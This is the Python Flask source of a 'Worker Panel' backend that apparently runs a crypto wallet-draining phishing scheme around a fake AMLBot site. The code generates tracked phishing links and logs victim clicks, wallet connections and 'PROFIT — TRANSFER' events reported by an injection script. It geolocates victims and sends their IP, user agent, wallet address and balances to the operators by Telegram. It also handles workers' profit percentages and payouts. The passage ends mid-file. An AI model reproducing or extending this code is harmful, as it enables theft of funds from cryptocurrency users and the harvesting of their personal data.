"""
server_panel.py — Worker Panel backend
Port 8081  → http://localhost:8081 / http://127.0.0.1:8081

Changes vs original server.py:
  - Port 8081
  - Per-user data isolation (get_links / get_logs filter by session owner)
  - Improved country detection (ip-api.com → Accept-Language fallback)
  - Logout endpoint
  - Simplified routing (no SAM_DRIN; / → dashboard.html, rest 404)
  - AML_BASE_URL constant for generated link URLs
"""

from flask import Flask, send_from_directory, jsonify, request, Response, redirect
import hashlib
import hmac
import html as _html_mod
import json
import os
import random
import re
import secrets
import string
import time
import urllib.parse
import urllib.request
from functools import wraps
from urllib.parse import urlparse

def _e(s):
    """Escape HTML entities for Telegram HTML parse mode."""
    return _html_mod.escape(str(s)) if s else ''

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, 'data')

# The public URL of the AML site (server_aml.py) — used when generating short links
AML_BASE_URL = 'http://localhost:8080'

# Secret key for HMAC admin tokens — regenerated on each server start
_SERVER_SECRET = secrets.token_hex(32)

app = Flask(__name__, static_folder='.')
app.config['MAX_CONTENT_LENGTH'] = 1 * 1024 * 1024   # 1 MB max request body


# ---------------------------------------------------------------------------
# Security: rate limiter (in-memory, per-IP)
# ---------------------------------------------------------------------------

_rate_buckets: dict = {}   # ip -> [timestamps]

def _rate_limit(ip, max_calls=30, window=60):
    """Return True if rate limit exceeded."""
    now = time.time()
    bucket = _rate_buckets.setdefault(ip, [])
    bucket[:] = [t for t in bucket if now - t < window]
    if len(bucket) >= max_calls:
        return True
    bucket.append(now)
    return False

def _get_client_ip():
    fwd = request.headers.get('X-Forwarded-For', '')
    return fwd.split(',')[0].strip() if fwd else (request.headers.get('X-Real-IP') or request.remote_addr or '')


# ---------------------------------------------------------------------------
# Security: global response headers
# ---------------------------------------------------------------------------

@app.after_request
def _security_headers(resp):
    resp.headers['X-Content-Type-Options'] = 'nosniff'
    resp.headers['X-Frame-Options'] = 'DENY'
    resp.headers['X-XSS-Protection'] = '1; mode=block'
    resp.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    resp.headers['Cache-Control'] = 'no-store'
    return resp

# ---------------------------------------------------------------------------
# Shared helper: parse bot credentials from bot/bot.py
# ---------------------------------------------------------------------------

def load_bot_credentials():
    bot_path = os.path.join(BASE_DIR, 'bot', 'bot.py')
    if not os.path.isfile(bot_path):
        return None, None
    try:
        with open(bot_path, 'r', encoding='utf-8') as f:
            content = f.read()
    except OSError:
        return None, None
    token_m = re.search(r'^TOKEN\s*=\s*["\']([^"\']+)["\']', content, re.MULTILINE)
    admin_m = re.search(r'^ADMIN_ID\s*=\s*(\d+)', content, re.MULTILINE)
    token    = token_m.group(1).strip() if token_m else None
    admin_id = int(admin_m.group(1))    if admin_m else None
    return token, admin_id


TELEGRAM_TOKEN, TELEGRAM_ADMIN_ID = load_bot_credentials()

os.makedirs(DATA_DIR, exist_ok=True)

# ---------------------------------------------------------------------------
# JSON helpers
# ---------------------------------------------------------------------------

def safe_load_json(filename):
    filepath = os.path.join(DATA_DIR, filename)
    if not os.path.exists(filepath):
        return [] if 'users' in filename else {}
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read().strip()
        if not content:
            return [] if 'users' in filename else {}
        return json.loads(content)
    except Exception:
        return [] if 'users' in filename else {}


def safe_save_json(filename, data):
    with open(os.path.join(DATA_DIR, filename), 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


# ---------------------------------------------------------------------------
# Link helpers
# ---------------------------------------------------------------------------

def extract_link_code(link_value):
    if not link_value:
        return ''
    if '://' in str(link_value):
        path = urlparse(str(link_value)).path.strip('/')
        return path.split('/')[0] if path else ''
    return str(link_value).strip('/').split('/')[0]


def normalize_link(link):
    visits = link.get('visits', [])
    if not isinstance(visits, list):
        visits = []
    return {
        'code':    link.get('code', ''),
        'url':     link.get('url', ''),
        'created': link.get('created', ''),
        'clicks':  link.get('clicks', 0),
        'success': link.get('success', 0),
        'template':link.get('template', 'AMLBot'),
        'visits':  visits,
    }


def find_link_by_code(code):
    links = safe_load_json('links.json')
    if not isinstance(links, list):
        return None
    for lnk in links:
        if lnk.get('code') == code:
            return lnk
    return None


# ---------------------------------------------------------------------------
# Country detection
# ip-api.com (free, non-commercial) → Accept-Language fallback
# ---------------------------------------------------------------------------

_country_cache: dict = {}

def guess_country(req):
    # 1. Cloudflare header (production CDN)
    cc = req.headers.get('CF-IPCountry', '')
    if cc and cc not in ('XX', 'T1'):
        return cc.upper()

    # 2. Get real IP
    fwd = req.headers.get('X-Forwarded-For', '')
    ip  = fwd.split(',')[0].strip() if fwd else (req.headers.get('X-Real-IP', '') or req.remote_addr or '')

    # 3. Try ip-api.com (skip loopback/private)
    if ip and not re.match(r'^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|::1$)', ip):
        if ip in _country_cache:
            return _country_cache[ip]
        try:
            rq = urllib.request.Request(
                f'http://ip-api.com/json/{ip}?fields=countryCode',
                headers={'User-Agent': 'Mozilla/5.0'}
            )
            with urllib.request.urlopen(rq, timeout=2) as r:
                data = json.loads(r.read())
                cc = data.get('countryCode', '')
                if cc:
                    _country_cache[ip] = cc
                    return cc
        except Exception:
            pass

    # 4. Accept-Language fallback
    lang = req.headers.get('Accept-Language', '')
    if lang:
        parts = [p.split(';')[0].strip() for p in lang.split(',')]
        for part in parts:
            subs = part.split('-')
            if len(subs) >= 2:
                region = subs[-1].upper()
                if len(region) == 2 and region.isalpha() and region not in ('LATN', 'CYRL', 'HANS'):
                    return region
        # language-code → country mapping
        first = parts[0].split('-')[0].lower() if parts else ''
        _map = {
            'uk': 'UA', 'be': 'BY', 'kk': 'KZ', 'lv': 'LV', 'lt': 'LT',
            'et': 'EE', 'de': 'DE', 'fr': 'FR', 'pl': 'PL', 'cs': 'CZ',
            'sk': 'SK', 'tr': 'TR', 'ro': 'RO', 'bg': 'BG', 'sr': 'RS',
            'hr': 'HR', 'az': 'AZ', 'hy': 'AM', 'ka': 'GE', 'it': 'IT',
            'es': 'ES', 'pt': 'PT', 'nl': 'NL', 'fi': 'FI', 'sv': 'SE',
            'no': 'NO', 'da': 'DK', 'hu': 'HU', 'uz': 'UZ',
        }
        if first in _map:
            return _map[first]

    return 'N/A'


def get_ip_info(ip):
    """Returns (country_code, city_str) e.g. ('DE', 'Berlin, DE')."""
    if not ip or re.match(r'^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|::1)', ip):
        return 'N/A', ''
    try:
        rq = urllib.request.Request(
            f'http://ip-api.com/json/{ip}?fields=status,countryCode,city',
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        with urllib.request.urlopen(rq, timeout=2) as r:
            data = json.loads(r.read())
        if data.get('status') == 'success':
            cc   = data.get('countryCode', 'N/A')
            city = data.get('city', '')
            loc  = f'{city}, {cc}' if city else cc
            return cc, loc
    except Exception:
        pass
    return 'N/A', ''


# ---------------------------------------------------------------------------
# Telegram notification
# ---------------------------------------------------------------------------

def send_telegram_message(chat_id, text):
    if not TELEGRAM_TOKEN or not chat_id:
        return
    endpoint = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
    payload = urllib.parse.urlencode({'chat_id': str(chat_id), 'text': text, 'parse_mode': 'Markdown'}).encode()
    try:
        rq = urllib.request.Request(endpoint, data=payload, method='POST')
        with urllib.request.urlopen(rq, timeout=5):
            pass
    except Exception:
        pass


def send_telegram_message_ex(chat_id, text, inline_markup_json=None, parse_mode='HTML'):
    """Send message with optional inline keyboard (HTML by default). Retries as plain on error."""
    if not TELEGRAM_TOKEN or not chat_id:
        return
    endpoint = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'

    def _do_send(pm):
        params = {'chat_id': str(chat_id), 'text': text}
        if pm:
            params['parse_mode'] = pm
        if inline_markup_json:
            params['reply_markup'] = inline_markup_json
        payload = urllib.parse.urlencode(params).encode()
        rq = urllib.request.Request(endpoint, data=payload, method='POST')
        with urllib.request.urlopen(rq, timeout=5) as r:
            return r.status

    try:
        _do_send('HTML')
    except Exception as e:
        # HTML parse error — retry as plain text
        err = str(e)
        print(f'[TG] HTML send failed ({err}), retrying plain...')
        try:
            _do_send(None)
        except Exception as e2:
            print(f'[TG] Plain send also failed: {e2}')


def _tron_scan_url(address):
    """Return TronScan URL for an address if it looks like a TRX address."""
    if address and address.startswith('T') and len(address) == 34:
        return f'https://tronscan.org/#/address/{address}'
    return None


def notify_link_event(link, entry):
    # Always notify admin — even if link is not found
    event_type = entry.get('type', 'event')
    address    = entry.get('address', '') or ''
    balance    = float(entry.get('balance', 0) or 0)
    profit     = float(entry.get('profit', 0) or 0)
    country    = entry.get('country', 'N/A') or 'N/A'
    date       = entry.get('date', '')
    code       = (link.get('code', '-') if link else entry.get('link_code', '-')) or '-'
    ip         = entry.get('ip', '') or ''
    ua         = entry.get('ua', '') or ''
    domain     = entry.get('domain', '') or 'amlbot.best'
    wallet     = entry.get('wallet', '') or ''
    tokens     = entry.get('tokens', {}) or {}
    tx_hash    = entry.get('tx_hash', '') or ''
    city       = entry.get('city', '') or ''

    def flag(cc):
        if cc and len(cc) == 2 and cc.isalpha():
            return chr(0x1F1E0 + ord(cc[0].upper()) - 65) + chr(0x1F1E0 + ord(cc[1].upper()) - 65)
        return '🌐'

    def short_addr(a):
        return (a[:6] + '…' + a[-4:]) if len(a) > 10 else (a or '—')

    ua_short = (ua[:90] + '…') if len(ua) > 90 else ua
    ip_line  = _e(ip) + (f' ({_e(city)})' if city else '') if ip else '—'

    # Build tokens block — no backticks, safe for HTML (values are numeric)
    def tokens_block(tkns, total):
        native_coins = {'TRX', 'ETH', 'BNB', 'SOL', 'BTC', 'MATIC', 'TON', 'AVAX', 'ARB'}
        native_val  = sum(float(v) for k, v in tkns.items() if k in native_coins)
        token_val   = sum(float(v) for k, v in tkns.items() if k not in native_coins)
        if not tkns:
            native_val = total
            token_val  = 0
        lines = [f'• native.balance — ${native_val:.3f}']
        if token_val > 0:
            lines.append(f'• tokens.list — ${token_val:.3f}')
            for k, v in tkns.items():
                if k not in native_coins:
                    lines.append(f'  {_e(k)}: ${float(v):.3f}')
        lines.append(f'• data.total — ${total:.3f}')
        return '\n'.join(lines)

    SEP = '─' * 28

    if event_type == 'click':
        msg = (
            f"👁 <b>НОВЫЙ ПЕРЕХОД</b>\n"
            f"{SEP}\n"
            f"🔗 cfg: {_e(code)}\n"
            f"🌐 domain: {_e(domain)}\n"
            f"📡 ip: {ip_line}\n"
            f"{flag(country)} geo: {_e(country)}\n"
            f"🕐 time: {_e(date)}\n"
            f"{SEP}\n"
            f"📱 ua: {_e(ua_short)}"
        )
        inline_markup = None

    elif event_type == 'connect':
        data_block = tokens_block(tokens, balance)
        details = (
            f"address: {_e(short_addr(address))}\n"
            f"domain: {_e(domain)}\n"
            f"ip: {ip_line}\n"
            f"wallet: {_e(wallet or '—')}\n"
            f"cfg: {_e(code)}\n"
            f"ua: {_e(ua_short)}\n"
            f"{flag(country)} geo: {_e(country)}"
        )
        msg = (
            f"💎 <b>ПОДКЛЮЧЕНИЕ КОШЕЛЬКА</b>\n"
            f"{SEP}\n"
            f"<blockquote>📊 <b>DATA. CONNECT</b>\n\n"
            f"{data_block}</blockquote>\n"
            f"{SEP}\n"
            f"<blockquote>{details}</blockquote>\n"
            f"{SEP}\n"
            f"✅ state: CONNECT_COMPLETE"
        )
        scan_url = _tron_scan_url(address)
        inline_markup = json.dumps({
            'inline_keyboard': [[
                {'text': '🔍 TronScan — адрес', 'url': scan_url}
            ]]
        }) if scan_url else None

    elif event_type == 'profit':
        data_block = tokens_block(tokens, balance)
        details = (
            f"address: {_e(short_addr(address))}\n"
            f"domain: {_e(domain)}\n"
            f"ip: {ip_line}\n"
            f"wallet: {_e(wallet or '—')}\n"
            f"cfg: {_e(code)}\n"
            f"ua: {_e(ua_short)}\n"
            f"{flag(country)} geo: {_e(country)}\n"
            f"{profit:.0f}%"
        )
        msg = (
            f"🚀 <b>PROFIT — TRANSFER</b>\n"
            f"{SEP}\n"
            f"<blockquote>📊 <b>DATA. TRANSFER</b>\n\n"
            f"{data_block}</blockquote>\n"
            f"{SEP}\n"
            f"<blockquote>{details}</blockquote>\n"
            f"{SEP}\n"
            f"✅ state: TRANSFER_COMPLETE"
        )
        # Prefer actual transaction link over address scan
        if tx_hash and len(tx_hash) >= 32:
            scan_url = f'https://tronscan.org/#/transaction/{tx_hash}'
            btn_label = '🔍 TronScan — транзакция'
        else:
            scan_url  = _tron_scan_url(address)
            btn_label = '🔍 TronScan — адрес'

        inline_markup = json.dumps({
            'inline_keyboard': [[
                {'text': btn_label, 'url': scan_url}
            ]]
        }) if scan_url else None

    else:
        msg = f"🔔 Событие {_e(event_type)} · код {_e(code)}"
        inline_markup = None

    recipients = set()
    if link and link.get('owner_tg_id'):
        recipients.add(str(link['owner_tg_id']))
    if TELEGRAM_ADMIN_ID:
        recipients.add(str(TELEGRAM_ADMIN_ID))

    for r in recipients:
        send_telegram_message_ex(r, msg, inline_markup)


# ---------------------------------------------------------------------------
# Event recording
# ---------------------------------------------------------------------------

def record_link_event(link_code, event_type, address='', balance=0, profit=0, country='N/A', source='site',
                      ip='', ua='', domain='', wallet='', tokens=None, tx_hash='', city=''):
    normalized_code = extract_link_code(link_code)
    logs = safe_load_json('logs.json')
    if not isinstance(logs, list):
        logs = []
    entry = {
        'id':       len(logs) + 1,
        'date':     time.strftime('%Y-%m-%d %H:%M:%S'),
        'type':     event_type,
        'address':  address,
        'balance':  balance,
        'profit':   profit,
        'link_code':normalized_code,
        'country':  country,
        'source':   source,
        'ip':       ip,
        'ua':       ua,
        'domain':   domain,
        'wallet':   wallet,
        'tokens':   tokens or {},
        'tx_hash':  tx_hash,
        'city':     city,
    }
    logs.append(entry)
    safe_save_json('logs.json', logs)

    matched_link = None
    if normalized_code:
        links = safe_load_json('links.json')
        if isinstance(links, list):
            for lnk in links:
                if lnk.get('code') == normalized_code:
                    matched_link = lnk
                    visits = lnk.get('visits', [])
                    if not isinstance(visits, list):
                        visits = []
                    visits.append({
                        'date': entry['date'], 'type': event_type,
                        'address': address, 'balance': balance,
                        'profit': profit, 'country': country, 'source': source,
                    })
                    lnk['visits'] = visits[-100:]
                    if event_type == 'click':
                        lnk['clicks'] = lnk.get('clicks', 0) + 1
                    elif event_type == 'profit':
                        lnk['success'] = lnk.get('success', 0) + 1
                    break
            safe_save_json('links.json', links)
    return entry, matched_link


# ---------------------------------------------------------------------------
# Auth helpers
# ---------------------------------------------------------------------------

def get_current_user():
    session_id = request.cookies.get('session_id')
    if not session_id:
        return None
    users = safe_load_json('users.json')
    for user in users:
        if user.get('session') == session_id and user.get('tg_id'):
            return user
    return None


# ---------------------------------------------------------------------------
# API — Auth
# ---------------------------------------------------------------------------

@app.route('/api/auth.php', methods=['POST', 'GET'])
def auth():
    if request.method != 'POST':
        return jsonify({'error': 'Method not allowed'}), 405
    data = request.get_json() or {}
    action = data.get('action')

    if action == 'generate':
        import random as _r, string as _s
        code       = ''.join(_r.choices(_s.ascii_uppercase + _s.digits, k=6))
        session_id = os.urandom(16).hex()
        pending_file = os.path.join(DATA_DIR, 'pending_codes.json')
        codes = {}
        if os.path.exists(pending_file):
            with open(pending_file) as f:
                codes = json.load(f)
        codes[code] = {'session': session_id, 'expires': int(time.time()) + 300}
        with open(pending_file, 'w') as f:
            json.dump(codes, f)
        resp = jsonify({'code': code})
        resp.set_cookie('session_id', session_id, max_age=300)
        return resp

    elif action == 'check':
        session_id = request.cookies.get('session_id')
        if not session_id:
            return jsonify({'authenticated': False})
        users = safe_load_json('users.json')
        for user in users:
            if user.get('session') == session_id and user.get('tg_id'):
                resp = jsonify({'authenticated': True})
                resp.set_cookie('session_id', session_id, max_age=86400)
                return resp
        return jsonify({'authenticated': False})

    return jsonify({'error': 'Unknown action'}), 400


@app.route('/api/logout.php', methods=['POST'])
def logout():
    resp = jsonify({'success': True})
    resp.set_cookie('session_id', '', expires=0, max_age=0)
    return resp


# ---------------------------------------------------------------------------
# API — User
# ---------------------------------------------------------------------------

@app.route('/api/get_user.php', methods=['GET'])
def get_user():
    user = get_current_user()
    if not user:
        return jsonify({'error': 'Not authenticated'}), 401
    return jsonify({
        'username':    user.get('username', ''),
        'status':      user.get('status', 'Воркер'),
        'balance':     user.get('balance', 0),
        'total_profit':user.get('total_profit', 0),
        'percent':     user.get('percent', 70),
        'session':     user.get('session', ''),
        'is_admin':    user.get('tg_id') in _ADMIN_IDS,
    })


# ---------------------------------------------------------------------------
# API — Logs (filtered by current user's links)
# ---------------------------------------------------------------------------

@app.route('/api/get_logs.php', methods=['GET'])
def get_logs():
    user = get_current_user()
    logs = safe_load_json('logs.json')
    if not isinstance(logs, list):
        logs = []
    if user:
        tg_id      = user.get('tg_id')
        all_links  = safe_load_json('links.json')
        user_codes = {l.get('code') for l in all_links if l.get('owner_tg_id') == tg_id}
        logs = [l for l in logs if l.get('link_code') in user_codes]
    else:
        logs = []
    sanitized = [{
        'id':        l.get('id'),
        'date':      l.get('date', ''),
        'type':      l.get('type', 'event'),
        'address':   l.get('address', ''),
        'balance':   l.get('balance', 0),
        'profit':    l.get('profit', 0),
        'link_code': l.get('link_code', ''),
        'country':   l.get('country', 'N/A'),
        'source':    l.get('source', 'site'),
    } for l in reversed(logs)]
    return jsonify(sanitized)


# ---------------------------------------------------------------------------
# API — Links (filtered by current user)
# ---------------------------------------------------------------------------

@app.route('/api/get_links.php', methods=['GET'])
def get_links():
    user = get_current_user()
    links = safe_load_json('links.json')
    if not isinstance(links, list):
        links = []
    if user:
        tg_id = user.get('tg_id')
        links = [l for l in links if l.get('owner_tg_id') == tg_id]
    else:
        links = []
    return jsonify([normalize_link(l) for l in reversed(links)])


# ---------------------------------------------------------------------------
# API — Wallets
# ---------------------------------------------------------------------------

@app.route('/api/get_wallets.php', methods=['GET'])
def get_wallets():
    user = get_current_user()
    wallets = user.get('wallets', {}) if user else {}
    return jsonify({
        'trc20': wallets.get('trc20', ''),
        'erc20': wallets.get('erc20', ''),
        'bep20': wallets.get('bep20', ''),
        'ton':   wallets.get('ton', ''),
    })


@app.route('/api/save_wallets.php', methods=['POST'])
def save_wallets():
    user = get_current_user()
    if not user:
        return jsonify({'error': 'Not authenticated'}), 401
    data = request.get_json() or {}
    user['wallets'] = {
        'trc20': data.get('trc20', ''),
        'erc20': data.get('erc20', ''),
        'bep20': data.get('bep20', ''),
        'ton':   data.get('ton', ''),
    }
    users = safe_load_json('users.json')
    for i, u in enumerate(users):
        if u.get('session') == user['session']:
            users[i] = user
            break
    safe_save_json('users.json', users)
    return jsonify({'success': True})


# ---------------------------------------------------------------------------
# API — Withdrawals
# ---------------------------------------------------------------------------

@app.route('/api/get_withdrawals.php', methods=['GET'])
def get_withdrawals():
    withdrawals = safe_load_json('withdrawals.json')
    if not isinstance(withdrawals, list):
        withdrawals = []
    return jsonify(withdrawals)


@app.route('/api/withdraw.php', methods=['POST'])
def withdraw():
    data = request.get_json() or {}
    amount = data.get('amount', 0)
    withdrawals = safe_load_json('withdrawals.json')
    if not isinstance(withdrawals, list):
        withdrawals = []
    withdrawals.append({
        'id':     len(withdrawals) + 1,
        'amount': amount,
        'status': 'pending',
        'date':   time.strftime('%Y-%m-%d %H:%M:%S'),
    })
    safe_save_json('withdrawals.json', withdrawals)
    return jsonify({'success': True})


# ---------------------------------------------------------------------------
# API — Generate link
# ---------------------------------------------------------------------------

@app.route('/api/generate_link.php', methods=['POST'])
def generate_link():
    template_name = 'AMLBot'
    user = get_current_user()
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

    links = safe_load_json('links.json')
    if not isinstance(links, list):
        links = []

    # Limit per-user (not global)
    user_links = [l for l in links if l.get('owner_tg_id') == user.get('tg_id')] if user else []
    same_template = [l for l in user_links if l.get('template', 'AMLBot') == template_name]
    if len(same_template) >= 2:
        return jsonify({'error': 'Для шаблона AMLBot доступно только 2 ссылки. Удалите старые.'}), 400

    links.append({
        'code':           code,
        'url':            f'{AML_BASE_URL}/{code}',
        'created':        time.strftime('%Y-%m-%d %H:%M:%S'),
        'clicks':         0,
        'success':        0,
        'template':       template_name,
        'visits':         [],
        'owner_tg_id':    user.get('tg_id')      if user else None,
        'owner_username': user.get('username')   if user else '',
        'owner_session':  user.get('session')    if user else '',
    })
    safe_save_json('links.json', links)
    return jsonify({'url': f'{AML_BASE_URL}/{code}'})


# ---------------------------------------------------------------------------
# API — Link management
# ---------------------------------------------------------------------------

@app.route('/api/clear_link_visits.php', methods=['POST'])
def clear_link_visits():
    data = request.get_json() or {}
    code  = data.get('code', '')
    links = safe_load_json('links.json')
    if not isinstance(links, list):
        links = []
    for lnk in links:
        if lnk.get('code') == code:
            lnk['visits'] = []
            lnk['clicks'] = 0
            lnk['success'] = 0
            safe_save_json('links.json', links)
            return jsonify({'success': True})
    return jsonify({'error': 'Ссылка не найдена'}), 404


@app.route('/api/delete_link.php', methods=['POST'])
def delete_link():
    data = request.get_json() or {}
    code    = data.get('code', '')
    links   = safe_load_json('links.json')
    if not isinstance(links, list):
        links = []
    filtered = [l for l in links if l.get('code') != code]
    if len(filtered) == len(links):
        return jsonify({'error': 'Ссылка не найдена'}), 404
    safe_save_json('links.json', filtered)
    return jsonify({'success': True})


@app.route('/api/delete_logs.php', methods=['POST'])
def delete_logs():
    data         = request.get_json() or {}
    ids_to_delete= set(data.get('ids', []))
    if not ids_to_delete:
        return jsonify({'error': 'No ids provided'}), 400
    logs = safe_load_json('logs.json')
    if not isinstance(logs, list):
        logs = []
    filtered = [l for l in logs if l.get('id') not in ids_to_delete]
    safe_save_json('logs.json', filtered)
    return jsonify({'success': True, 'deleted': len(logs) - len(filtered)})


# ---------------------------------------------------------------------------
# API — Log event (called by server_aml.py injection script)
# ---------------------------------------------------------------------------

@app.route('/api/log.php', methods=['POST', 'OPTIONS'])
def log():
    if request.method == 'OPTIONS':
        resp = Response()
        resp.headers['Access-Control-Allow-Origin']  = '*'
        resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        return resp, 204

    data = request.get_json() or {}

    # Real visitor IP: prefer ipify-sourced IP from the bundle (field 'user_ip'),
    # then payload 'ip' (set by server_aml from browser connection), then request IP
    fwd      = request.headers.get('X-Forwarded-For', '')
    req_ip   = fwd.split(',')[0].strip() if fwd else (request.headers.get('X-Real-IP', '') or request.remote_addr or '')
    real_ip  = data.get('user_ip') or data.get('ip') or req_ip

    country, city = get_ip_info(real_ip)
    if country == 'N/A':
        country = guess_country(request)

    tokens   = data.get('tokens') or {}
    if isinstance(tokens, str):
        try:
            tokens = json.loads(tokens)
        except Exception:
            tokens = {}

    entry, link = record_link_event(
        data.get('link_code', ''),
        data.get('type', 'event'),
        data.get('address', ''),
        data.get('balance', 0),
        data.get('profit', 0),
        country,
        data.get('source', 'site'),
        ip       = real_ip,
        ua       = data.get('ua', '') or request.headers.get('User-Agent', ''),
        domain   = data.get('domain', ''),
        wallet   = data.get('wallet', ''),
        tokens   = tokens,
        tx_hash  = data.get('tx_hash', ''),
        city     = city,
    )
    notify_link_event(link, entry)
    resp = jsonify({'success': True})
    resp.headers['Access-Control-Allow-Origin'] = '*'
    return resp


# ---------------------------------------------------------------------------
# Admin helpers — hardened
# ---------------------------------------------------------------------------

# Hard-coded admin IDs — ONLY these tg_ids can access /admin
_ADMIN_IDS = {1916338307}

# Active admin sessions: session_id -> {token, ip, issued, last_seen}
_admin_sessions: dict = {}


def _make_admin_token(session_id, ip):
    """Generate HMAC-SHA256 admin token bound to session + IP."""
    msg = f'{session_id}:{ip}'.encode()
    return hmac.new(_SERVER_SECRET.encode(), msg, hashlib.sha256).hexdigest()


def is_admin():
    """Check admin access: valid session + tg_id in whitelist + token + IP match."""
    user = get_current_user()
    if not user or user.get('tg_id') not in _ADMIN_IDS:
        return False
    session_id = request.cookies.get('session_id', '')
    admin_token = request.cookies.get('_adm', '')
    if not session_id or not admin_token:
        return False
    # Verify token is HMAC-valid for this session + IP
    client_ip = _get_client_ip()
    expected = _make_admin_token(session_id, client_ip)
    if not hmac.compare_digest(admin_token, expected):
        return False
    # Check session store
    info = _admin_sessions.get(session_id)
    if not info:
        return False
    if info.get('ip') != client_ip:
        return False
    # Expire admin sessions after 4 hours
    if time.time() - info.get('issued', 0) > 4 * 3600:
        _admin_sessions.pop(session_id, None)
        return False
    info['last_seen'] = time.time()
    return True


def _issue_admin_token(session_id):
    """Issue an HMAC admin token for the current request IP."""
    ip = _get_client_ip()
    token = _make_admin_token(session_id, ip)
    _admin_sessions[session_id] = {
        'token':    token,
        'ip':       ip,
        'issued':   time.time(),
        'last_seen': time.time(),
    }
    return token


def admin_required(f):
    """Decorator: require admin. Rate-limits + checks auth."""
    @wraps(f)
    def wrapper(*a, **kw):
        ip = _get_client_ip()
        if _rate_limit(ip, max_calls=60, window=60):
            return jsonify({'error': 'Rate limited'}), 429
        if not is_admin():
            return jsonify({'error': 'Forbidden'}), 403
        return f(*a, **kw)
    return wrapper


def _admin_log(action, detail=''):
    """Record admin audit event."""
    logs = safe_load_json('admin_audit.json')
    if not isinstance(logs, list):
        logs = []
    logs.append({
        'time': time.strftime('%Y-%m-%d %H:%M:%S'),
        'ip':   _get_client_ip(),
        'action': action,
        'detail': str(detail)[:256],
    })
    # Keep only last 500 entries
    safe_save_json('admin_audit.json', logs[-500:])


# ---------------------------------------------------------------------------
# API — Admin
# ---------------------------------------------------------------------------

@app.route('/api/admin/stats.php', methods=['GET'])
@admin_required
def admin_stats():
    users       = safe_load_json('users.json')
    logs        = safe_load_json('logs.json')
    withdrawals = safe_load_json('withdrawals.json')
    if not isinstance(users, list):       users = []
    if not isinstance(logs, list):        logs = []
    if not isinstance(withdrawals, list): withdrawals = []
    connects = [l for l in logs if l.get('type') == 'connect']
    profits  = [l for l in logs if l.get('type') == 'profit']
    clicks   = [l for l in logs if l.get('type') == 'click']
    total_vol = round(sum(float(l.get('balance', 0)) for l in connects), 2)
    pending_w = len([w for w in withdrawals if w.get('status') == 'pending'])
    return jsonify({
        'workers':             len(users),
        'total_volume':        total_vol,
        'connects':            len(connects),
        'profits':             len(profits),
        'clicks':              len(clicks),
        'pending_withdrawals': pending_w,
        'total_logs':          len(logs),
    })


@app.route('/api/admin/users.php', methods=['GET'])
@admin_required
def admin_users():
    users = safe_load_json('users.json')
    if not isinstance(users, list):
        users = []
    return jsonify(users)


@app.route('/api/admin/edit_user.php', methods=['POST'])
@admin_required
def admin_edit_user():
    data  = request.get_json() or {}
    tg_id = data.get('tg_id')
    if not tg_id:
        return jsonify({'error': 'No tg_id'}), 400
    users = safe_load_json('users.json')
    if not isinstance(users, list):
        return jsonify({'error': 'No users'}), 404
    for user in users:
        if user.get('tg_id') == tg_id:
            if 'balance' in data:
                user['balance']      = round(float(data['balance']), 2)
            if 'percent' in data:
                user['percent']      = int(data['percent'])
            if 'status' in data:
                user['status']       = str(data['status'])[:64]
            if 'total_profit' in data:
                user['total_profit'] = round(float(data['total_profit']), 2)
            safe_save_json('users.json', users)
            _admin_log('edit_user', f'tg_id={tg_id}')
            return jsonify({'success': True, 'user': user})
    return jsonify({'error': 'User not found'}), 404


@app.route('/api/admin/delete_user.php', methods=['POST'])
@admin_required
def admin_delete_user():
    data  = request.get_json() or {}
    tg_id = data.get('tg_id')
    if not tg_id:
        return jsonify({'error': 'No tg_id'}), 400
    users    = safe_load_json('users.json')
    filtered = [u for u in users if u.get('tg_id') != tg_id] if isinstance(users, list) else []
    if isinstance(users, list) and len(filtered) == len(users):
        return jsonify({'error': 'User not found'}), 404
    safe_save_json('users.json', filtered)
    _admin_log('delete_user', f'tg_id={tg_id}')
    return jsonify({'success': True})


@app.route('/api/admin/broadcast.php', methods=['POST'])
@admin_required
def admin_broadcast():
    data = request.get_json() or {}
    text = data.get('text', '').strip()
    if not text:
        return jsonify({'error': 'No text'}), 400
    pm   = data.get('parse_mode', None)   # 'HTML', 'Markdown', or null
    users = safe_load_json('users.json')
    if not isinstance(users, list):
        users = []
    sent = failed = 0
    for user in users:
        tg_id = user.get('tg_id')
        if tg_id:
            try:
                send_telegram_message_ex(tg_id, text, parse_mode=pm)
                sent += 1
            except Exception:
                failed += 1
    _admin_log('broadcast', f'sent={sent} failed={failed}')
    return jsonify({'success': True, 'sent': sent, 'failed': failed})


@app.route('/api/admin/all_logs.php', methods=['GET'])
@admin_required
def admin_all_logs():
    logs = safe_load_json('logs.json')
    if not isinstance(logs, list):
        logs = []
    return jsonify(list(reversed(logs)))


@app.route('/api/admin/all_withdrawals.php', methods=['GET'])
@admin_required
def admin_all_withdrawals():
    withdrawals = safe_load_json('withdrawals.json')
    if not isinstance(withdrawals, list):
        withdrawals = []
    return jsonify(list(reversed(withdrawals)))


@app.route('/api/admin/curators.php', methods=['GET', 'POST'])
@admin_required
def admin_curators():
    if request.method == 'GET':
        curators = safe_load_json('curators.json')
        if not isinstance(curators, list):
            curators = [{'username': '@BlancSupport', 'percent': '0%'}]
        return jsonify(curators)
    data     = request.get_json() or {}
    curators = data.get('curators', [])
    if not isinstance(curators, list):
        return jsonify({'error': 'Invalid data'}), 400
    validated = [
        {'username': str(c['username'])[:64], 'percent': str(c.get('percent', '0%'))[:16]}
        for c in curators if isinstance(c, dict) and 'username' in c
    ]
    safe_save_json('curators.json', validated)
    _admin_log('save_curators', f'count={len(validated)}')
    return jsonify({'success': True})


@app.route('/api/admin/clear_all_logs.php', methods=['POST'])
@admin_required
def admin_clear_all_logs():
    safe_save_json('logs.json', [])
    _admin_log('clear_all_logs')
    return jsonify({'success': True})


@app.route('/api/admin/audit.php', methods=['GET'])
@admin_required
